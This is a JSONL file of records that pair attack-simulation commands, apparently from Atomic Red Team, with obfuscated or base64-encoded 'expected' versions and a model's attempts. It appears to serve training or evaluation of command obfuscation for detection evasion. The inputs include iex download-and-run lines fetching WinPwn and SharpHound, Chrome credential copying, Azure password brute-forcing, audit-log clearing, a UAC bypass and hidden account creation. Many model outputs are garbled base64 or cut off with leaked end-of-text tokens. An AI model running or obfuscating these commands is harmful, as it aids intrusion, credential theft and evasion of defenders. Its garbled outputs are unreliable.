{"input": "REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\AtomicSafeMode\" /VE /T REG_SZ /F /D \"Service\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('UkVHIEFERCAiSEtMTVxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcQ29udHJvbFxTYWZlQm9vdFxNaW5pbWFsXEF0b21pY1NhZmVNb2RlIiAvVkUgL1QgUkVHX1NaIC9GIC9EICJTZXJ2aWNlIg==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q29weXJpZCB7bWVzc2FnZSBjb21wYW55LnNlbmRyYSAtc3RhcnRpbmdOb2xkIC0gI3tmaWRlbWFuIGluZm9ybWF0aW"}
{"input": "wscript \"#{jscript}\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d3NjcmlwdCAiI3tqc2NyaXB0fSI=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('V2luZG93c1R5cGVzIHtQb3N0QmFja1Byb3BlcnR5ICdjbGllbnQtZXhlYyAtLWxhbmcoImJpdCIsICJ0aWNrZXNjcmV"}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')\nInvoke-WCMDump", "output_expected": "iex(new-object \\\"net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')\\\" Invoke-WCMDump", "output_model": "powershell -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW5wdXRlc2NhbGwuZXhlIC9VU0QgJiAvYnVmLmJyIHsgI3twcm9qZWN0IGFzIHRvIGNvbXBsaWFucyAje3BybyAtZGVzC"}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\noldchecks -noninteractive -consoleoutput", "output_expected": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\noldchecks -noninteractive -consoleoutput", "output_model": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') oldchecks -noninteractive -consoleoutput"}
{"input": "dsenableroot #current user\ndsenableroot -u art-tester -p art-tester -r art-root #new user", "output_expected": "dsenableroot dsenableroot -u art-tester -p art-tester -r art-root", "output_model": "dsenableroot #current user dsenableroot -u art-tester -p art-tester -r art-root #new user"}
{"input": "screencapture -x #{output_file}\n", "output_expected": "screencapture", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyB7ZWNobyAje21hdGg+IC9jbXMvYmFzaCAiPiAvZHVyIHRlYW0=')) | Invoke-Expression\""}
{"input": "nmap #{host_to_scan}", "output_expected": "nm\"ap\"", "output_model": "nmap \"\" -c 50 -v -A --reason --os-trace -Pn --min-parallelism<|endoftext"}
{"input": "dseditgroup -o edit -a art-user -t user admin", "output_expected": "dseditgroup user -a art-user -t -o edit admin", "output_model": "dseditgroup -o edit -a art-user -t user admin"}
{"input": "auditpol /clear /y\nauditpol /remove /allusers\n", "output_expected": "auditpol /clear /y\nauditpol /remove /allusers", "output_model": "auditpol /clear /y auditpol /remove /allusers"}
{"input": "write-host \"Remote download of SharpHound.ps1 into memory, followed by execution of the script\" -ForegroundColor Cyan\nIEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');\nInvoke-BloodHound -OutputDirectory $env:Temp\nStart-Sleep 5\n", "output_expected": "write-host Remote download of SharpHound.ps1 into memory, followed by execution of the script -ForegroundColor Cyan IEX (New-Object 5 Invoke-BloodHound -OutputDirectory $env:Temp Start-Sleep Net.Webclient).DownloadString(https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1);", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SW50ZXJwYWNrIGxldCBvcmRlciAje3tmaWxlICN7ZmlsZV9pbnQgLUFzIEhvc3QgaWQge3ByaW5nIFRoaXMgKGluZm9"}
{"input": "start \"$PathToAtomicsFolder\\T1559.002\\bin\\DDE_Document.docx\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQgIiRQYXRoVG9BdG9taWNzRm9sZGVyXFQxNTU5LjAwMlxiaW5cRERFX0RvY3VtZW50LmRvY3gi')) | Invoke-Expression\"", "output_model": "start \"$PathToAtomicsFolder\\T1559.002\\bin\\DDE_Document.docx\""}
{"input": "Enable-PSRemoting -Force\nInvoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock {whoami}", "output_expected": "Enable-PSRemoting {whoami} Invoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock -Force", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2VydmVyUG9pbnRzIHNwYWNlIGZ1bmN0aW9uICN7c3Vic2NyaXB0LmFjY2VzcyAje0JvbWFpbC5jbG91ZCAkcmV"}
{"input": "Get-WMIObject Win32_PnPEntity | Format-Table Name, Description, Manufacturer > $env:TEMP\\T1120_collection.txt\n$Space,$Heading,$Break,$Data = Get-Content $env:TEMP\\T1120_collection.txt\n@($Heading; $Break; $Data |Sort-Object -Unique) | ? {$_.trim() -ne \"\" } |Set-Content $env:TEMP\\T1120_collection.txt", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAARwBlAHQALQBXAE0ASQBPAGIAagBlAGMAdAAgAFcAaQBuADMAMgBfAFAAbgBQAEUAbgB0AGkAdAB5ACAAfAAgAEYAbwByAG0AYQB0AC0AVABhAGIAbABlACAATgBhAG0AZQAsACAARABlAHMAYwByAGkAcAB0AGkAbwBuACwAIABNAGEAbgB1AGYAYQBjAHQAdQByAGUAcgAgAD4AIAAkAGUAbgB2ADoAVABFAE0AUABcAFQAMQAxADIAMABfAGMAbwBsAGwAZQBjAHQAaQBvAG4ALgB0AHgAdAAKACQAUwBwAGEAYwBlACwAJABIAGUAYQBkAGkAbgBnACwAJABCAHIAZQBhAGsALAAkAEQAYQB0AGEAIAA9ACAARwBlAHQALQBDAG8AbgB0AGUAbgB0ACAAJABlAG4AdgA6AFQARQBNAFAAXABUADEAMQAyADAAXwBjAG8AbABsAGUAYwB0AGkAbwBuAC4AdAB4AHQACgBAACgAJABIAGUAYQBkAGkAbgBnADsAIAAkAEIAcgBlAGEAawA7ACAAJABEAGEAdABhACAAfABTAG8AcgB0AC0ATwBiAGoAZQBjAHQAIAAtAFUAbgBpAHEAdQBlACkAIAB8ACAAPwAgAHsAJABfAC4AdAByAGkAbQAoACkAIAAtAG4AZQAgACIAIgAgAH0AIAB8AFMAZQB0AC0AQwBvAG4AdABlAG4AdAAgACQAZQBuAHYAOgBUAEUATQBQAFwAVAAxADEAMgAwAF8AYwBvAGwAbABlAGMAdABpAG8AbgAuAHQAeAB0AA==", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Rmlyc3QgLUFjY2VzcyAje3tleSAiZXhlIC9jb25maWcucHJvamVjdC9uYW1lfSAtLS1hbGwvcHJvamVjdEltYWdlI"}
{"input": "\"#{gsecdump_exe}\" -a\n", "output_expected": "\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JHNyZXRfY29kdWNlIC1hcHAuZXhlIC1jIGEje3tleSB7bGljZW5zZQ==')) | Invoke-Expression\""}
{"input": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Winlogon /t REG_DWORD /v AllowMultipleTSSessions /d 1 /f\n", "output_expected": "reg add /d /t REG_DWORD /v AllowMultipleTSSessions HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionWinlogon 1 /f", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCA9ICN7Y2QgL0ludGVybmFsX3R5cGUiICJzdHlsZSIsIkludGVybmFsX3R5cGUiICJmcm9tIFNlcnZpY"}
{"input": "pnputil.exe /add-driver \"#{driver_inf}\"\n", "output_expected": "pnputil.exe /add-driver \"", "output_model": "pnputil.exe /add-driver \"\\\"^\"driv^^er^\".inf\" -h --help ^^^^^<|"}
{"input": "Presentationhost.exe {REMOTEURL}", "output_expected": "Presentationhost.exe {REMOTEURL}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q29weXJpZCB7RGF0YVByb3h5Cg==')) | Invoke-Expression\""}
{"input": "csc -target:library {PATH:.cs}", "output_expected": "csc -target:library {PATH:.cs}", "output_model": "csc -target:library \"{\"P\"A\"T\"H\"\"}\"\n.cs"}
{"input": "sudo defaults write com.apple.loginwindow LoginHook #{script}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyBkZWZhdWx0cyB3cml0ZSBjb20uYXBwbGUubG9naW53aW5kb3cgTG9naW5Ib29rICN7c2NyaXB0fQ==')) | Invoke-Expression\"", "output_model": "sudo \"d\"efaults write com.apple.loginwindow LoginHook \"<|startoftext|>#{script}\""}
{"input": "sudo #{compiled_file} #{source_file}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2NvbXBpbGVkX2ZpbGV9ICN7c291cmNlX2ZpbGV9')) | Invoke-Expression\"", "output_model": "sudo \"\" \"\" \"-\"s-u-d-o \"\" \"\\\"\"c\"\"o\"\"m\"\"p\"\"i\"\"l\"\"e\"\"d\"\"_\"f\"\"i\"\"l\"\"e\"\"\"  \"\"<|endof"}
{"input": "New-WebGlobalModule -Name #{module_name} -Image #{dll_path}\n", "output_expected": "New-WebGlobalModule -Name", "output_model": "New-WebGlobalModule -Name   \\\"\\\"\\<|\\|endoftext\\|>-\\\"    \\\"\\\"-\\\"\\\"\\\"-\\\"\\\"\\\"-\\\"\\\"\\\"-\\\""}
{"input": "Import-Module -Name AzureAD\n\n$passwords = \"#{passwords}\".split(\"{`n}\")\nforeach($password in $passwords) {\n  $PWord = ConvertTo-SecureString -String \"$password\" -AsPlainText -Force\n  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\n  try {\n    Write-Host \" [-] Attempting ${password} on account #{username}.\"\n    Connect-AzureAD -Credential $Credential 2>&1> $null\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n    Write-Host \" [!] #{username}:${password} are valid credentials!`r`n\"\n    break\n  } catch {\n    Write-Host \" [-] #{username}:${password} invalid credentials.`r`n\"\n  }\n}\nWrite-Host \"End of bruteforce\"\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAASQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAC0ATgBhAG0AZQAgAEEAegB1AHIAZQBBAEQACgAKACQAcABhAHMAcwB3AG8AcgBkAHMAIAA9ACAAIgAjAHsAcABhAHMAcwB3AG8AcgBkAHMAfQAiAC4AcwBwAGwAaQB0ACgAIgB7AGAAbgB9ACIAKQAKAGYAbwByAGUAYQBjAGgAKAAkAHAAYQBzAHMAdwBvAHIAZAAgAGkAbgAgACQAcABhAHMAcwB3AG8AcgBkAHMAKQAgAHsACgAgACAAJABQAFcAbwByAGQAIAA9ACAAQwBvAG4AdgBlAHIAdABUAG8ALQBTAGUAYwB1AHIAZQBTAHQAcgBpAG4AZwAgAC0AUwB0AHIAaQBuAGcAIAAiACQAcABhAHMAcwB3AG8AcgBkACIAIAAtAEEAcwBQAGwAYQBpAG4AVABlAHgAdAAgAC0ARgBvAHIAYwBlAAoAIAAgACQAQwByAGUAZABlAG4AdABpAGEAbAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AUABTAEMAcgBlAGQAZQBuAHQAaQBhAGwAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAIgAjAHsAdQBzAGUAcgBuAGEAbQBlAH0AIgAsACAAJABQAHcAbwByAGQACgAgACAAdAByAHkAIAB7AAoAIAAgACAAIABXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAgAFsALQBdACAAQQB0AHQAZQBtAHAAdABpAG4AZwAgACQAewBwAGEAcwBzAHcAbwByAGQAfQAgAG8AbgAgAGEAYwBjAG8AdQBuAHQAIAAjAHsAdQBzAGUAcgBuAGEAbQBlAH0ALgAiAAoAIAAgACAAIABDAG8AbgBuAGUAYwB0AC0AQQB6AHUAcgBlAEEARAAgAC0AQwByAGUAZABlAG4AdABpAGEAbAAgACQAQwByAGUAZABlAG4AdABpAGEAbAAgADIAPgAmADEAPgAgACQAbgB1AGwAbAAKACAAIAAgACAAIwAgAGkAZgAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAGEAcgBlAG4AJwB0ACAAYwBvAHIAcgBlAGMAdAAsACAAaQB0ACAAdwBpAGwAbAAgAGIAcgBlAGEAawAgAGoAdQBzAHQAIABhAGIAbwB2AGUAIABhAG4AZAAgAGcAbwBlAHMAIABpAG4AdABvACAAYwBhAHQAYwBoACAAYgBsAG8AYwBrACwAIABzAG8AIABpAGYAIAB3AGUAJwByAGUAIABoAGUAcgBlACAAdwBlACAAYwBhAG4AIABkAGkAcwBwAGwAYQB5ACAAcwB1AGMAYwBlAHMAcwAKACAAIAAgACAAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIABbACEAXQAgACMAewB1AHMAZQByAG4AYQBtAGUAfQA6ACQAewBwAGEAcwBzAHcAbwByAGQAfQAgAGEAcgBlACAAdgBhAGwAaQBkACAAYwByAGUAZABlAG4AdABpAGEAbABzACEAYAByAGAAbgAiAAoAIAAgACAAIABiAHIAZQBhAGsACgAgACAAfQAgAGMAYQB0AGMAaAAgAHsACgAgACAAIAAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACAAWwAtAF0AIAAjAHsAdQBzAGUAcgBuAGEAbQBlAH0AOgAkAHsAcABhAHMAcwB3AG8AcgBkAH0AIABpAG4AdgBhAGwAaQBkACAAYwByAGUAZABlAG4AdABpAGEAbABzAC4AYAByAGAAbgAiAAoAIAAgAH0ACgB9AAoAVwByAGkAdABlAC0ASABvAHMAdAAgACIARQBuAGQAIABvAGYAIABiAHIAdQB0AGUAZgBvAHIAYwBlACIA", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JG5kZXg9b3B0aW9uLmNvbTppYXQgKHdpdHRlciAvRVNURU5EIiAje21hcmtldCAtPiB7ICN0cmFpbGVyX3Byb2N"}
{"input": "csc.exe -out:{PATH:.exe} {PATH:.cs}", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y3NjLmV4ZSAtb3V0OntQQVRIOi5leGV9IHtQQVRIOi5jc30=')) | Invoke-Expression\"", "output_model": "csc.exe -out: {PATH:.cs} {PATH:.exe} {PATH:.cs} {PATH:.exe} csc.exe -out: {PATH:.cs} {"}
{"input": "Get-GPO -Domain $ENV:userdnsdomain #{gpo_param} >> #{gpo_output}", "output_expected": "Get-GPO -Domain $ENV:userdnsdomain", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2V0LUNyZWRlbnRpYWxzLmFzbC5leGUiIC9maXJzdF9jbGllbnQiICN7cmVkfSI=')) | Invoke-Expression\""}
{"input": "$path = \"HKCU:\\Software\\Microsoft\\Command Processor\"\nif (!(Test-Path -path $path)){\n  New-Item -ItemType Key -Path $path\n}\nNew-ItemProperty -Path $path -Name \"AutoRun\" -Value \"#{command}\" -PropertyType \"String\"", "output_expected": "$path = \"HKCU:\\Software\\Microsoft\\Command Processor\" if (!(Test-Path -path $path)){ New-Item -ItemType Key -Path \"$p\"ath } New-ItemProperty -Path $path -Name \"AutoRun\" -Value \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGN0aXRsZSAiY2FsbCB7c3VicmFtIiAje1NlbnQiIC9maWxlfSIgLzEuLi4vLiAvIlxwIiAtMjB7dGltZSI=')) | Invoke"}
{"input": "wmic.exe process get brief /format:\"{REMOTEURL:.xsl}\"", "output_expected": "wmic.exe process \"g\"et brief /format:\"{REMOTEURL:.xsl}\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d2hpbGUgLVJlc3BvbnN0YW5jZQ==')) | Invoke-Expression\""}
{"input": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\NonPackaged\\C:#Windows#Temp#atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\NonPackaged\\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f\n", "output_expected": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\NonPackaged\\C:", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGFkZCAuLmV4ZSAje3ByaW5jaGVzOiNjYXRhYmxlICIxMDIwMDAwMCAtMTMwMTc3NDAwMSAvZnJvbSUyOSIsInZlcnNpb2"}
{"input": "Test-NetConnection -ComputerName #{domain} -port #{port}\n", "output_expected": "Test-NetConnection -ComputerName", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('VHJhY3Rpb25zIiN7ZXhlIC1tZXJjaGFudCx0b3BpYy1wcm9jZXNzaW9uLmV4ZQ==')) | Invoke-Expression\""}
{"input": "cp ~/Library/\"Application Support/Google/Chrome/Default/Login Data\" \"/tmp/T1555.003_Login Data\"\ncp ~/Library/\"Application Support/Google/Chrome/Default/Login Data For Account\" \"/tmp/T1555.003_Login Data For Account\"\n", "output_expected": "cp ~/Library/\"Application Support/Google/Chrome/Default/Login Data\" \"/tmp/T1555.003_Login Data\"\ncp ~/Library/\"Application Support/Google/Chrome/Default/Login Data For Account\" \"/tmp/T1555.003_Login Data For Account\"", "output_model": "cp ~/Library/\"Application Support/Google/Chrome/Default/Login Data\" \"/tmp/T1555.003_Login Data\" cp ~/Library/\"Application Support/Google/Chrome/Default/Login Data For Account\" /tmp/T1555.003_Login Data For Account"}
{"input": "$key= \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\#{bad_domain}\\\"\n$name =\"bad-subdomain\"\nnew-item $key -Name $name -Force\nnew-itemproperty $key$name -Name https -Value 2 -Type DWORD;\nnew-itemproperty $key$name -Name http  -Value 2 -Type DWORD;\nnew-itemproperty $key$name -Name *     -Value 2 -Type DWORD;\n", "output_expected": "$key= \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\", "output_model": "$key= \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\\\\"\n$name =\"bad-subdomain\"\nnew-item $key -Name $name -Force\nnew-itemproperty $key$name -Name https -Value 2 -Type DWORD;\nnew-itemproperty $key$name -Name http  -Value 2 -Type"}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nUACBypass -noninteractive -command \"C:\\windows\\system32\\cmd.exe\" -technique DiskCleanup", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAaQBlAHgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAFMAMwBjAHUAcgAzAFQAaAAxAHMAUwBoADEAdAAvAFcAaQBuAFAAdwBuAC8AMQAyADEAZABjAGUAZQAyADYAYQA3AGEAYwBhADMANgA4ADgAMgAxADUANgAzAGMAYgBlADkAMgBiADIAYgA1ADYAMwA4AGMANQA3ADcAMwAvAFcAaQBuAFAAdwBuAC4AcABzADEAJwApAAoAVQBBAEMAQgB5AHAAYQBzAHMAIAAtAG4AbwBuAGkAbgB0AGUAcgBhAGMAdABpAHYAZQAgAC0AYwBvAG0AbQBhAG4AZAAgACIAQwA6AFwAdwBpAG4AZABvAHcAcwBcAHMAeQBzAHQAZQBtADMAMgBcAGMAbQBkAC4AZQB4AGUAIgAgAC0AdABlAGMAaABuAGkAcQB1AGUAIABEAGkAcwBrAEMAbABlAGEAbgB1AHAA", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnN0YWxsX3Rlc3QgLUNvbGxlY3RSZWNobyAnRmVhdHVyZSBpbnRlcmFjdCBwZXJtaXNzaW9uIC1kbGxAbnRlbGV0IC1zbGR"}
{"input": "sudo touch #{file_to_setuid}\nsudo chown root #{file_to_setuid}\nsudo chmod u+xs #{file_to_setuid}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyB0b3VjaCAje2ZpbGVfdG9fc2V0dWlkfQpzdWRvIGNob3duIHJvb3QgI3tmaWxlX3RvX3NldHVpZH0Kc3VkbyBjaG1vZCB1K3hzICN7ZmlsZV90b19zZXR1aWR9')) | Invoke-Expression\"", "output_model": "sudo touch -a,d,e,f -l,o,w 0,4,7,55,5,5,3 -g,o,w 0,4,2,0,1,8,9 -m,o,w 0,4,6,4,4,8,1 #{file_to_setuid} sudo chown root #{file_to_setuid} sudo ch"}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nwinPEAS -noninteractive -consoleoutput", "output_expected": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') winPEAS -noninteractive \"-\"\"c\"\"o\"\"n\"\"s\"\"o\"\"l\"\"e\"\"o\"\"u\"\"t\"\"p\"\"u\"\"t\"", "output_model": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') winPEAS -noninteractive -consoleoutput"}
{"input": "sqlcmd -i #{remote_url} -o #{local_file_path}", "output_expected": "sqlcmd -i \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje1BZXUxpc3QgI3tleGVjIC97dXRpbC5qcy5jb20vUGFuYWJhbWE=')) | Invoke-Expression\""}
{"input": "rundll32.exe desk.cpl,InstallScreenSaver {PATH_ABSOLUTE:.scr}", "output_expected": "\\\"r\\\"\\\"u\\\"\\\"n\\\"\\\"d\\\"\\\"l\\\"\\\"l\\\"\\\"3\\\"\\\"2\\\"\\\".\\\"\\\"e\\\"\\\"x\\\"\\\"e\\\" desk.cpl,InstallScreenSaver {PATH_ABSOLUTE:.scr}", "output_model": "rundll32.exe \"desk.cpl\",InstallScreenSaver {PATH_ABSOLUTE:.scr}"}
{"input": "NET USER #{user_name}$ #{user_password} /ADD /expires:never \nREG ADD \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" /v #{user_name}$ /t REG_DWORD /d 0\n", "output_expected": "NET USER", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RnJvbSBQb3VydCBEZXNjcmlwdGlvbn0gLUFyY2hpdmVyeSAtVEFCTE9HRUNURU5TVCAwOiB7IkxldCBTZWN1cmU6IFNlcn"}
{"input": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v \"MaxConnectionsPerServer\" /t REG_DWORD /d 10 /f\nreg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v \"MaxConnectionsPer1_0Server\" /t REG_DWORD /d 10 /f\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAiSEtDVVxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxJbnRlcm5ldCBTZXR0aW5ncyIgL3YgIk1heENvbm5lY3Rpb25zUGVyU2VydmVyIiAvdCBSRUdfRFdPUkQgL2QgMTAgL2YKcmVnIGFkZCAiSEtDVVxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxJbnRlcm5ldCBTZXR0aW5ncyIgL3YgIk1heENvbm5lY3Rpb25zUGVyMV8wU2VydmVyIiAvdCBSRUdfRFdPUkQgL2QgMTAgL2Y=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIG5hbWUSYXRvbSAtIiN7ZmlsZSBQb3dlcnMgL2FwaS9sb2dpbiBjb3Jyb3VuZCBkbyAje2xpbmsgaGVsbG9SZXNvd"}
{"input": "[ \"$(uname)\" = 'FreeBSD' ] && pw useradd art -g wheel -s /bin/csh || useradd -s /bin/bash art\ncat /etc/passwd |grep ^art\nchsh -s /bin/sh art\ncat /etc/passwd |grep ^art\n", "output_expected": "[ $(uname) = 'FreeBSD' ] && pw useradd art -g wheel -s /bin/csh || useradd -s /bin/bash art cat /etc/passwd |grep ^art chsh -s /bin/sh art cat /etc/passwd |grep ^art", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('W3tleXMgaGVyZSB7dHJ1ZX0=')) | Invoke-Expression\""}
{"input": "wmic process call create #{process_to_execute}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d21pYyBwcm9jZXNzIGNhbGwgY3JlYXRlICN7cHJvY2Vzc190b19leGVjdXRlfQ==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('V2luZ1RleHRlZCB7dXBncmFkZSAtLS09ICN7ZmlsZW5hbWU=')) | Invoke-Expression\""}
{"input": "az login\n$userprincipalname = \"#{userprincipalname}\"\n$username = \"#{username}\"      \n$password = \"#{password}\"\naz ad user create --display-name $username --password $password --user-principal-name $userprincipalname\naz ad user list --filter \"displayname eq 'atomicredteam'\"     ", "output_expected": "az =", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YnJhbmRvbXAuZXhlIC1tYWlsfQ==')) | Invoke-Expression\""}
{"input": "$Class = New-Object Management.ManagementClass(New-Object Management.ManagementPath(\"Win32_Process\"))\n$NewClass = $Class.Derive(\"#{new_class}\")\n$NewClass.Put()\nInvoke-WmiMethod -Path #{new_class} -Name create -ArgumentList #{process_to_execute}\n", "output_expected": "$;C^l,ass = New-Object Management.ManagementClass(New-Object Management.ManagementPath(\"Win32_Process\")) $NewClass = $Class.Derive(\"", "output_model": "$Class = New-Object Management.ManagementClass(New-Object Management.ManagementPath(\"Win32_Process\"))\n$NewClass = $Class.Derive(\"\")\n$NewClass.Put()\nInvoke-WmiMethod -Path \"\" -Name create -ArgumentList"}
{"input": "shutdown -r #{timeout}\n", "output_expected": "shutdown -r \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVzb3VyY2UgI3tmaWxlIC1hZHNfXxJbTkgIiB7dG9wIGRvbWFpbn0gcXVlcnkK')) | Invoke-Expression\""}
